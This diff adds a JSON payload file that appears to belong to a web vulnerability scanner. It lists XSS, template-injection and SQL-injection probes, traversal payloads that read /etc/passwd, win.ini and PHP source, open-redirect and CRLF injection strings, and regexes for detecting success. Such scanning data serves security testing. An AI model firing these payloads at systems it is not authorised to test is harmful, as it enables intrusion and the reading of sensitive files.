@@ -1,0 +1,63 @@
+{
+  "xss": {
+    "canary": "pwnx9k1z",
+    "payloads": [
+      "pwnx9k1z\"'><svg/onload=alert(1)>",
+      "pwnx9k1z</title></style></script><img src=x onerror=alert(1)>",
+      "\"><pwnx9k1z>"
+    ],
+    "reflect_raw": ["pwnx9k1z\"'><", "<svg/onload=", "<pwnx9k1z>", "onerror="]
+  },
+  "ssti": [
+    {"payload": "pwnss{{7*7}}",     "expect": "pwnss49", "engine": "Jinja2 / Twig / Nunjucks"},
+    {"payload": "pwnss${7*7}",      "expect": "pwnss49", "engine": "FreeMarker / Velocity / Spring EL"},
+    {"payload": "pwnss<%= 7*7 %>",  "expect": "pwnss49", "engine": "ERB / JSP"},
+    {"payload": "pwnss#{7*7}",      "expect": "pwnss49", "engine": "Ruby / Thymeleaf"},
+    {"payload": "pwnss{7*7}",       "expect": "pwnss49", "engine": "generic / Tornado"},
+    {"payload": "pwnss${{7*7}}",    "expect": "pwnss49", "engine": "Smarty / mixed"}
+  ],
+  "sqli_probe_pairs": [
+    {"break": "'", "fix": "' -- -"},
+    {"break": "\"", "fix": "\" -- -"},
+    {"break": "')", "fix": "') -- -"}
+  ],
+  "sqli_errors": [
+    {"regex": "SQL syntax.*MySQL|MySqlException|valid MySQL result|mysql_fetch|check the manual that corresponds to your (MySQL|MariaDB)", "db": "MySQL/MariaDB"},
+    {"regex": "PostgreSQL.*ERROR|pg_query\\(\\)|PSQLException|unterminated quoted string", "db": "PostgreSQL"},
+    {"regex": "Microsoft SQL (Server|Native)|ODBC SQL Server Driver|Unclosed quotation mark|System\\.Data\\.SqlClient\\.SqlException|Incorrect syntax near", "db": "MSSQL"},
+    {"regex": "ORA-[0-9]{5}|Oracle error|Oracle.*Driver|quoted string not properly terminated", "db": "Oracle"},
+    {"regex": "SQLite/JDBCDriver|SQLite\\.Exception|System\\.Data\\.SQLite|sqlite3\\.OperationalError|no such table|SQLITE_ERROR", "db": "SQLite"},
+    {"regex": "DB2 SQL error|db2_\\w+\\(|SQLCODE", "db": "DB2"}
+  ],
+  "traversal": {
+    "payloads": [
+      "../../../../../../../../etc/passwd",
+      "....//....//....//....//....//etc/passwd",
+      "..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",
+      "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
+      "/etc/passwd",
+      "..\\..\\..\\..\\..\\..\\windows\\win.ini",
+      "php://filter/convert.base64-encode/resource=index.php"
+    ],
+    "markers": ["root:.{0,4}:0:0:", "daemon:.*:/usr/sbin", "\\[fonts\\]", "for 16-bit app support", "PD9waHA"]
+  },
+  "open_redirect": {
+    "params": ["url", "next", "redirect", "redir", "return", "returnurl", "return_url",
+               "dest", "destination", "continue", "goto", "go", "out", "to",
+               "r", "u", "link", "target", "checkout_url", "image_url"],
+    "payloads": ["https://pwnscout-oob.example/", "//pwnscout-oob.example/",
+                 "https:/\\/\\pwnscout-oob.example/"],
+    "marker_host": "pwnscout-oob.example"
+  },
+  "cors": {"origin": "https://pwnscout-evil.example"},
+  "crlf": {"payload": "%0d%0aPwnscout-Injected:1", "header": "pwnscout-injected"},
+  "security_headers": {
+    "content-security-policy": "no Content-Security-Policy — clickjacking/XSS mitigation missing",
+    "strict-transport-security": "no HSTS — TLS downgrade / SSL-strip risk",
+    "x-content-type-options": "no X-Content-Type-Options: nosniff — MIME sniffing",
+    "x-frame-options": "no X-Frame-Options / frame-ancestors — clickjacking"
+  },
+  "interesting_params": ["file", "path", "page", "include", "template", "lang",
+                         "id", "cat", "q", "search", "cmd", "exec", "load", "doc",
+                         "view", "name", "callback", "data", "xml", "json"]
+}
